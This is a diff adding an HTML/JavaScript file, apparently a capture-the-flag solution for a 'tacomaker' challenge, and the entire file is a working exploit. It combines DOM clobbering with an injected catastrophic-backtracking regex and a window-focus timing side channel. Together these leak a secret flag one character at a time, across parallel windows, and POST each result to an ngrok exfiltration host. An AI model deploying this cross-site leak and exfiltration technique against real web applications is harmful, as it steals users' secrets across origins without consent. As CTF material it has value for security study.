@@ -1,0 +1,90 @@
+<html>
+<body>
+    <script>
+        const EXFIL_URL = 'http://x.ngrok.io'
+        const CHALL_URL = 'http://tacomaker:4000'
+        const ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ%-'\\\"!¡¿?&(),/:;<=>@[]_`{}~".split(""); // python's string.printable
+        const CLOBBERING = '<a id=config></a><a id=config name=dev></a><a id=ingredient href="//foo.bar/&ingredient=INJECTION"></a>'
+        var known = "FLAGHERE", opened = 0;
+        const PARALLEL_WINDOWS = 5;
+
+        // https://developer.mozilla.org/es/docs/Web/JavaScript/Guide/Regular_Expressions
+        function escapeRegExp(string) {
+            return string.replace(/[.*+\-?^$()|[\]\\]/g, '\\$&');
+        }
+
+        async function exfil(msg) {
+            console.log(msg)
+            await fetch(`${EXFIL_URL}/exfil`, { method: 'POST', body: msg, mode: 'no-cors' })
+        }
+
+        async function setFlag(flag) {
+            await fetch(`${EXFIL_URL}/setFlag`, { method: 'POST', body: flag, mode: 'no-cors' })
+        }
+
+        async function leak(char) {
+            let win = window.open(`${location.href}?foo`, "_blank"); // ?foo => location.search
+            exfil(`Testing ${known}(${char}) - ${opened}`); // await may make the script take too long
+            win.addEventListener("load", function () {
+                win.postMessage({ 'regex': `${encodeURIComponent(escapeRegExp(known + char))}(((((.*)*)*)*)*)!`, 'flag': `${known + char}` }, "*");
+            })
+        }
+
+        if (location.search.substr(1)) {
+
+            // sub
+            window.addEventListener("message", (event) => {
+                var frame = document.createElement('iframe')
+                let param = encodeURIComponent(CLOBBERING.replace('INJECTION', event.data.regex))
+                frame.src = `${CHALL_URL}/?taco_name=${param}`
+
+                frame.onload = function () {
+                    let counter = 0
+                    setInterval((() => {
+                        if (document.activeElement != document.body) {
+                            event.source.postMessage("foo", "*")
+                        } else {
+                            if (counter > 3) { // 5s
+                                event.source.postMessage(event.data.flag, "*")
+                            } else {
+                                counter++;
+                            }
+                        }
+                    }), 1000)
+                }
+
+                document.body.appendChild(frame);
+
+            });
+
+        } else {
+
+            // main
+            window.addEventListener("message", (event) => {
+                if (event.data != "foo") {
+                    known = event.data;
+                    setFlag(known)
+                }
+                event.source.close()
+                opened--
+            });
+
+
+            let iterator = 0;
+
+            setInterval((() => {
+                if (opened <= PARALLEL_WINDOWS) {
+                    leak(ALPHABET[iterator])
+                    opened++
+
+                    if (iterator == ALPHABET.length - 1) {
+                        iterator = 0;
+                    } else {
+                        ++iterator;
+                    }
+                }
+            }), 100)
+        }
+    </script>
+</body>
+</html>
